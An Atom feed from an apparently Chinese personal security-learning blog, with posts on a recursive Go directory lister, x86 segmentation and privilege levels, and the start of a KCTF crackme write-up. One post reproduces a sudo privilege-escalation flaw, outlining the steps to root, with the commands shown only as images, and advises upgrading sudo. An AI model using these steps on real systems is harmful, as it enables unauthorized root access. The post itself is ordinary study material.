<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>bufsnake</title>
  
  <subtitle>香香张</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bufsnake.github.io/"/>
  <updated>2019-10-16T04:37:42.232Z</updated>
  <id>https://bufsnake.github.io/</id>
  
  <author>
    <name>bufsnake</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>TODO...</title>
    <link href="https://bufsnake.github.io/TODO.html"/>
    <id>https://bufsnake.github.io/TODO.html</id>
    <published>9999-09-09T01:09:09.000Z</published>
    <updated>2019-10-16T04:37:42.232Z</updated>
    
    <content type="html"><![CDATA[<p><strong>TODO…约束自己执行想要执行的事情</strong></p><h3 id="This-is-my-TODO…"><a href="#This-is-my-TODO…" class="headerlink" title="This is my TODO…"></a>This is my TODO…</h3><p><img src="/images/pasted-144.png" alt="upload successful"></p><blockquote><p>还在学习中…</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;TODO…约束自己执行想要执行的事情&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;This-is-my-TODO…&quot;&gt;&lt;a href=&quot;#This-is-my-TODO…&quot; class=&quot;headerlink&quot; title=&quot;This is my TODO…&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>目录遍历到递归</title>
    <link href="https://bufsnake.github.io/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%88%B0%E9%80%92%E5%BD%92.html"/>
    <id>https://bufsnake.github.io/目录遍历到递归.html</id>
    <published>2019-10-30T12:18:23.000Z</published>
    <updated>2019-10-30T13:14:12.574Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完，一直在坚持和学校一样的教学体系，每天的课程是不一样的，不会导致学习疲劳，三分热度，一直抱着一本书看下去，几天就失了兴趣，比如编译原理…</p></blockquote><blockquote><p>一步一jo印</p></blockquote><h3 id="中序"><a href="#中序" class="headerlink" title="中序"></a>中序</h3><blockquote><p>之前学习Java时，没有想到写一个遍历指定目录的程序，最近在学习Golang，想着用GO语言实现以下。</p></blockquote><blockquote><p>思路</p></blockquote><ol><li>指定需要遍历的目录</li><li>列出目录下的所有文件以及文件夹</li><li>打印文件名或文件夹名</li><li>判断是否为文件夹，是则去第1步，否则去第5步</li><li>退出</li></ol><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><blockquote><p>用递归的方式实现该程序</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">listDir(<span class="string">"/Users/bufsnake"</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">listDir</span><span class="params">(dir <span class="keyword">string</span>, level <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">s := <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; level; i++ &#123;</span><br><span class="line">s = s + <span class="string">"   "</span></span><br><span class="line">&#125;</span><br><span class="line">fileInfos, err := ioutil.ReadDir(dir)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> fileInfos &#123;</span><br><span class="line">fi := dir + <span class="string">"/"</span> + file.Name()</span><br><span class="line">fmt.Println(s + fi)</span><br><span class="line"><span class="keyword">if</span> file.IsDir() &#123;</span><br><span class="line">listDir(fi, level+<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行结果</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">☁  golang  go run mulubianli.go</span><br><span class="line">/Users/bufsnake/golang/_</span><br><span class="line">   /Users/bufsnake/golang/_/main.go</span><br><span class="line">/Users/bufsnake/golang/array.go</span><br><span class="line">/Users/bufsnake/golang/bufio</span><br><span class="line">   /Users/bufsnake/golang/bufio/main.go</span><br><span class="line">/Users/bufsnake/golang/ch1</span><br><span class="line">   /Users/bufsnake/golang/ch1/dup1</span><br><span class="line">      /Users/bufsnake/golang/ch1/dup1/main.go</span><br><span class="line">   /Users/bufsnake/golang/ch1/dup2</span><br><span class="line">      /Users/bufsnake/golang/ch1/dup2/file</span><br><span class="line">      /Users/bufsnake/golang/ch1/dup2/main.go</span><br><span class="line">   /Users/bufsnake/golang/ch1/echo1</span><br><span class="line">      /Users/bufsnake/golang/ch1/echo1/main.go</span><br><span class="line">   /Users/bufsnake/golang/ch1/echo2</span><br><span class="line">      /Users/bufsnake/golang/ch1/echo2/main.go</span><br><span class="line">   /Users/bufsnake/golang/ch1/echo3</span><br><span class="line">      /Users/bufsnake/golang/ch1/echo3/main.go</span><br><span class="line">   /Users/bufsnake/golang/ch1/helloworld</span><br><span class="line">      /Users/bufsnake/golang/ch1/helloworld/README.md</span><br><span class="line">      /Users/bufsnake/golang/ch1/helloworld/main.go</span><br><span class="line">   /Users/bufsnake/golang/ch1/server1</span><br><span class="line">      /Users/bufsnake/golang/ch1/server1/mian.go</span><br><span class="line">/Users/bufsnake/golang/chabie</span><br><span class="line">   /Users/bufsnake/golang/chabie/chabie</span><br><span class="line">   /Users/bufsnake/golang/chabie/main.go</span><br><span class="line">/Users/bufsnake/golang/deferDemo.go</span><br><span class="line">/Users/bufsnake/golang/deferDemo1.go</span><br><span class="line">/Users/bufsnake/golang/exception.go</span><br><span class="line">/Users/bufsnake/golang/func.go</span><br><span class="line">/Users/bufsnake/golang/gob_msgpack.go</span><br><span class="line">/Users/bufsnake/golang/main.go</span><br><span class="line">/Users/bufsnake/golang/mapDemo.go</span><br><span class="line">/Users/bufsnake/golang/mulubianli.go</span><br><span class="line">/Users/bufsnake/golang/rand</span><br><span class="line">   /Users/bufsnake/golang/rand/main.go</span><br><span class="line">/Users/bufsnake/golang/strconv</span><br><span class="line">   /Users/bufsnake/golang/strconv/main.go</span><br><span class="line">/Users/bufsnake/golang/time</span><br><span class="line">   /Users/bufsnake/golang/time/main.go</span><br><span class="line">/Users/bufsnake/golang/web</span><br><span class="line">   /Users/bufsnake/golang/web/ch1</span><br><span class="line">      /Users/bufsnake/golang/web/ch1/login.gtpl</span><br><span class="line">      /Users/bufsnake/golang/web/ch1/main</span><br><span class="line">      /Users/bufsnake/golang/web/ch1/main.go</span><br><span class="line">   /Users/bufsnake/golang/web/ginDemo.go</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>Go Go Golang</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;半个月感觉没收获多少，主要学习了加密解密、编译原理、Windows内核相关基础教程、Golang的学习，并没有学完
      
    
    </summary>
    
      <category term="Go" scheme="https://bufsnake.github.io/categories/Go/"/>
    
    
      <category term="golang" scheme="https://bufsnake.github.io/tags/golang/"/>
    
      <category term="go" scheme="https://bufsnake.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>Sudo提权漏洞复现</title>
    <link href="https://bufsnake.github.io/Sudo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html"/>
    <id>https://bufsnake.github.io/Sudo提权漏洞复现.html</id>
    <published>2019-10-16T13:49:17.000Z</published>
    <updated>2019-10-16T14:00:24.956Z</updated>
    
    <content type="html"><![CDATA[<h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h3><blockquote><p>该漏洞虽然鸡肋，但保不准哪天碰到了，还是复现一下吧</p></blockquote><h3 id="Sudoer"><a href="#Sudoer" class="headerlink" title="Sudoer"></a>Sudoer</h3><blockquote><p>修改sudoer文件,如下</p></blockquote><p><img src="/images/pasted-176.png" alt="upload successful"></p><blockquote><p>我的低权限用户账号是admin</p></blockquote><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><blockquote><p>在admin账号权限下运行</p></blockquote><p><img src="/images/pasted-177.png" alt="upload successful"></p><blockquote><p>在vim界面输入</p></blockquote><p><img src="/images/pasted-178.png" alt="upload successful"></p><blockquote><p>得到root权限</p></blockquote><p><img src="/images/pasted-179.png" alt="upload successful"></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>sudo 1.8.28 之前的所有版本</p></blockquote><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><blockquote><p>升级sudo</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;该漏洞虽然鸡肋，但保不准哪天碰到了，还是复现一下吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;Sudoe
      
    
    </summary>
    
      <category term="学习研究" scheme="https://bufsnake.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="漏洞复现" scheme="https://bufsnake.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>段的机制浅析</title>
    <link href="https://bufsnake.github.io/%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90.html"/>
    <id>https://bufsnake.github.io/段的机制浅析.html</id>
    <published>2019-10-13T09:07:49.000Z</published>
    <updated>2019-10-13T12:57:23.411Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h2><blockquote><p>X86 CPU的3个模式：实模式(直接操作物理地址)、保护模式(操作虚拟内存)和虚拟8086模式(保护模式下的16位模拟)</p></blockquote><blockquote><p>X64：x86是intel推出的复杂指令集，后来amd拓展了X86指令集，称为称为x86-64，后更名为AMD 64，intel也出了自己的一套64位指令集，但是不向下兼容，所以就没了，继而移植了amd 64位指令集，称为intel 64(能够兼容x86指令集的)</p></blockquote><h2 id="段的机制"><a href="#段的机制" class="headerlink" title="段的机制"></a>段的机制</h2><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr ds:[<span class="number">0x123456</span>],eax</span><br><span class="line">实际操作的是 ds.base + <span class="number">0x123456</span> 地址</span><br></pre></td></tr></table></figure><h4 id="段寄存器的种类"><a href="#段寄存器的种类" class="headerlink" title="段寄存器的种类"></a>段寄存器的种类</h4><blockquote><p>ES(拓展段)、CS(代码段)、SS(堆栈段)、DS(数据段)、FS、GS、LDTR、TR 共8个段寄存器</p></blockquote><h4 id="段寄存器的读写"><a href="#段寄存器的读写" class="headerlink" title="段寄存器的读写"></a>段寄存器的读写</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读只能读<span class="number">16</span>位，写能写入<span class="number">96</span>位</span><br><span class="line">mov ax, ds必须指定写入的地址为<span class="number">16</span>位</span><br><span class="line">mov ds, eax</span><br><span class="line">除LDTR和TR外，其余段寄存器可用MOV指令进行读写</span><br></pre></td></tr></table></figure><h4 id="段寄存器的结构"><a href="#段寄存器的结构" class="headerlink" title="段寄存器的结构"></a>段寄存器的结构</h4><p><img src="/images/pasted-170.png" alt="upload successful"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegMent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Selecter,   <span class="number">16b</span>it<span class="comment">//可见部分 段选择子</span></span><br><span class="line">    WROD Attribute,  <span class="number">16b</span>it<span class="comment">//属性  可读/可写/可执行</span></span><br><span class="line">    DWORD Base,      <span class="number">16b</span>it<span class="comment">//Base  段的起始地址</span></span><br><span class="line">    DWORD Limit      <span class="number">16b</span>it<span class="comment">//Limit 段的整体长度</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-171.png" alt="upload successful"></p><h4 id="根据上图进行段寄存器的不可见部分探测"><a href="#根据上图进行段寄存器的不可见部分探测" class="headerlink" title="根据上图进行段寄存器的不可见部分探测"></a>根据上图进行段寄存器的不可见部分探测</h4><h5 id="探测Attribute是否存在"><a href="#探测Attribute是否存在" class="headerlink" title="探测Attribute是否存在"></a>探测Attribute是否存在</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov ax, cs</span><br><span class="line">        mov ds, ax                        <span class="comment">//ds == cs</span></span><br><span class="line">        mov dword ptr ds:[<span class="number">0x1000</span>], eax    <span class="comment">//对ds.base + 0x1000 地址进行操作就相当于对 cs.base + 0x1000 地址进行操作，但由于 cs 属性是不可写，所以编译出错。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="探测Base是否存在"><a href="#探测Base是否存在" class="headerlink" title="探测Base是否存在"></a>探测Base是否存在</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov ax, fs</span><br><span class="line">        mov ds, ax                   <span class="comment">//ds == fs</span></span><br><span class="line">        mov dword ptr ds:[<span class="number">0</span>], eax    <span class="comment">//对ds.base + 0x0 地址进行操作就相当于对 fs.base + 0x0 地址进行操作</span></span><br><span class="line">        <span class="comment">//等同 mov dword ptr [0x7FFDE000], eax ,正常情况下，我们对0地址是不能读也不能写，这里可以编译通过，是因为我们对地址 0x0x7FFDE000 进行写操作。将fs换成其余的段寄存器，就会报错</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="探测Limit是否存在"><a href="#探测Limit是否存在" class="headerlink" title="探测Limit是否存在"></a>探测Limit是否存在</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov ax, fs</span><br><span class="line">        mov ds, ax                        <span class="comment">//ds == fs</span></span><br><span class="line">        mov dword ptr ds:[<span class="number">0x1000</span>], eax    <span class="comment">//对ds.base + 0x1000 地址进行操作就相当于对 fs.base + 0x1000 地址进行操作，但由于 fs 支持的长度只是到0xFFF，0x1000 &gt; 0xFFF，所以编译出错。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="段描述符与段选择子"><a href="#段描述符与段选择子" class="headerlink" title="段描述符与段选择子"></a>段描述符与段选择子</h3><h4 id="GDT-全局描述符表-与LDT-本地描述符表"><a href="#GDT-全局描述符表-与LDT-本地描述符表" class="headerlink" title="GDT(全局描述符表)与LDT(本地描述符表)"></a>GDT(全局描述符表)与LDT(本地描述符表)</h4><blockquote><p>windbg查看GDT表</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r gdtr  <span class="comment">//查看GDT表的位置</span></span><br><span class="line">r gdtl  <span class="comment">//查看GDT表的长度</span></span><br><span class="line">dd <span class="number">0x80808080</span>(地址) <span class="comment">//查看指定地址的内容(四字节查看)</span></span><br><span class="line">dq <span class="number">0x80808080</span>(地址) <span class="comment">//查看指定地址的内容(八字节查看)</span></span><br><span class="line">dq <span class="number">0x80808080</span>(地址) L40 <span class="comment">//查看指定地址的内容(八字节查看)，显示40组</span></span><br></pre></td></tr></table></figure><h4 id="段选择子结构"><a href="#段选择子结构" class="headerlink" title="段选择子结构"></a>段选择子结构</h4><p><img src="/images/pasted-172.png" alt="upload successful"></p><h4 id="段描述符结构"><a href="#段描述符结构" class="headerlink" title="段描述符结构"></a>段描述符结构</h4><p><img src="/images/pasted-173.png" alt="upload successful"></p><p><img src="/images/pasted-174.png" alt="upload successful"></p><p><img src="/images/pasted-175.png" alt="upload successful"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据 E 拓展位</span><br><span class="line">根据D/B位可知段的上限，<span class="number">0</span>为<span class="number">64</span>kb，<span class="number">1</span>为<span class="number">4</span>GB。</span><br><span class="line">向上拓展</span><br><span class="line">ds.base + limit 的红色区域是可用的</span><br><span class="line">向下拓展</span><br><span class="line">出了红色部分，其余是可用的</span><br><span class="line">代码 C 一致位</span><br><span class="line">非一致代码段</span><br><span class="line">一致代码段</span><br></pre></td></tr></table></figure><h3 id="段权限检查"><a href="#段权限检查" class="headerlink" title="段权限检查"></a>段权限检查</h3><blockquote><p>CPU分为四个级别R0、R1、R2、R3(操作系统并没有使用R1、R2)，R0运行内核记驱动程序，R3运行用户层程序。</p></blockquote><p><code>CPL：当前特权级别</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">根据CS、SS的段选择子的RPL值可知道CPL的值</span><br><span class="line"></span><br><span class="line">假设CS为<span class="number">0x001B</span>（<span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="number">1011</span>）</span><br><span class="line">RPL为<span class="number">3</span>，所以CPL为<span class="number">3</span>，所以应用程序运行在<span class="number">3</span>环，是用户层程序。</span><br><span class="line"></span><br><span class="line">数据段的权限检查</span><br><span class="line">检查CPL权限是否大于等于DPL，RPL权限是否大于等于DPL</span><br><span class="line">假设CPL = <span class="number">0</span></span><br><span class="line">mov ax，<span class="number">000B</span></span><br><span class="line">mov ds，ax       <span class="comment">//RPL = 3，指向的段描述符的DPL为0</span></span><br><span class="line">CPL权限与DPL相同，检测通过，RPL权限比DPL权限低，检测失败</span><br><span class="line"></span><br><span class="line">代码段、系统描述符的权限检查与数据段不完全相同，后面会学习到。</span><br></pre></td></tr></table></figure><h3 id="段寄存器的操作"><a href="#段寄存器的操作" class="headerlink" title="段寄存器的操作"></a>段寄存器的操作</h3><blockquote><p>mov ds, ax //ds的值不能乱给，需要符合段选择子</p></blockquote><blockquote><p>除了mov指令还可以使用 LES，LSS，LDS，LFS，LGS指令修改段寄存器的值</p></blockquote><blockquote><p>没有LCS是因为更改CS涉及到更改EIP。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">例：</span><br><span class="line">    les ecx, fword ptr ds:[<span class="number">0x1000</span>] <span class="comment">//将ds.base + 0x1000 地址处的内容的高两个字节放入es，剩下四个字节放入ecx。fwrod（6字节）</span></span><br><span class="line"></span><br><span class="line">假设ax = <span class="number">0x001B</span>（<span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="number">1011</span>）</span><br><span class="line">所以：RPL = <span class="number">3</span>（请求特权级别为<span class="number">3</span>，由<span class="number">11</span>给出）</span><br><span class="line">     所要查询的表是GDT表（由 <span class="number">0</span> 给出）</span><br><span class="line">     指定获取表中下标为<span class="number">3</span>的段描述符（由<span class="number">0000</span> <span class="number">0000</span> <span class="number">0001</span> <span class="number">1</span>给出,假设为 <span class="number">0x004F9AFF</span>`<span class="number">0xFFFFFFFF</span>）</span><br><span class="line">     根据段描述符可得</span><br><span class="line">     段基地址：<span class="number">0x00FFFFFF</span></span><br><span class="line">        段极限：<span class="number">0x000FFFFF</span>(G位为<span class="number">0</span>，所以在前面填充<span class="number">12</span>个<span class="number">0</span>)</span><br><span class="line">        段的属性：<span class="number">0x4F9A</span></span><br></pre></td></tr></table></figure><h3 id="回过头，在看一下段寄存器的结构"><a href="#回过头，在看一下段寄存器的结构" class="headerlink" title="回过头，在看一下段寄存器的结构"></a>回过头，在看一下段寄存器的结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegMent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Selecter,   <span class="number">16b</span>it<span class="comment">//可见部分 段选择子         指向的是段选择子结构</span></span><br><span class="line">    WROD Attribute,  <span class="number">16b</span>it<span class="comment">//属性   可读/可写/可执行   指向的是段描述符结构的 G + D/B + L + AVL + 段界限0 + P + DPL + S + TYPE</span></span><br><span class="line">    DWORD Base,      <span class="number">32b</span>it<span class="comment">//Base  段的起始地址       指向的是段描述符结构的 段基地址0 + 段基地址1 + 段基地址2</span></span><br><span class="line">    DWORD Limit      <span class="number">32b</span>it<span class="comment">//Limit 段极限             指向的是段描述符结构的 段界限0 + 段界限1 合起来是20位，根据 G 位的值，若为0，则在其前面填充12位的0，最大就为0x000FFFFF，若为1，则在其后面填充12位的1，最大就为0xFFFFFFFF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">虽然只能可见部分只有<span class="number">16b</span>it，但是通过它去查找GDT/LDT表，就能获得其余<span class="number">80b</span>it的值</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>学习完这些，能够知道RPL、DPL、CPL分别只什么，怎么找到，段选择子与段描述符的结构以及每一位的作用，如何找到DGT/LDT表，能够按顺序背下ES、CS、SS、DS、FS、GS、LSTR、TR的名字，给一个段选择子能够分析出段的其余80bit的值。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;X86 CPU的3个模式：实模式(直接操作物理地址)、保护模式(操作虚拟内存)和虚拟8086模式(保护模式下的16
      
    
    </summary>
    
      <category term="保护机制" scheme="https://bufsnake.github.io/categories/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
    
      <category term="段的机制" scheme="https://bufsnake.github.io/tags/%E6%AE%B5%E7%9A%84%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>KCTF-1</title>
    <link href="https://bufsnake.github.io/KCTF-1.html"/>
    <id>https://bufsnake.github.io/KCTF-1.html</id>
    <published>2019-10-01T14:01:53.000Z</published>
    <updated>2019-10-01T14:31:48.569Z</updated>
    
    <content type="html"><![CDATA[<hr><h3 id="初世纪"><a href="#初世纪" class="headerlink" title="初世纪"></a>初世纪</h3><p><img src="/images/pasted-152.png" alt="upload successful"></p><blockquote><p>输入不正确就会出现这个弹窗</p></blockquote><h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><h5 id="定位WinMain函数"><a href="#定位WinMain函数" class="headerlink" title="定位WinMain函数"></a>定位WinMain函数</h5><p><img src="/images/pasted-153.png" alt="upload successful"></p><h5 id="找到DialogBoxParam的回调函数"><a href="#找到DialogBoxParam的回调函数" class="headerlink" title="找到DialogBoxParam的回调函数"></a>找到DialogBoxParam的回调函数</h5><p><img src="/images/pasted-154.png" alt="upload successful"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">函数原型：</span><br><span class="line">    <span class="keyword">int</span> DialogBoxParam（HINSTANCE hInstance，LPCTSTR IpTemplateName,HWND hWndParent， DLGPROC IPDialogFunc,LPARAM dwlnitParam）；</span><br><span class="line">参数：</span><br><span class="line">hlnstance       标识一个模块的实例，该模块的可执行文件含有对话框模板。</span><br><span class="line">IpTemplateName  标识对话框模板。此参数可以指向一个以<span class="literal">NULL</span>结尾的字符串的指针,该字符串指定对话框模扳名，或是指定对话框模板的资源标识符的一个整型值。如果此参数指定了一个资源标识符，则它的高位字一定为零，且低位字一定含有标识符。一定用MAKEINTRESOURCE宏指令创建此值。</span><br><span class="line">hWndParent      指定拥有对话框的窗口。</span><br><span class="line">IpDialogFunc    指向对话框过程的指针。</span><br><span class="line">dwInitParam     指定传递到对话框过程中的 WM_INITDIALOG 消息 IParam 参数的值。</span><br><span class="line">返回值 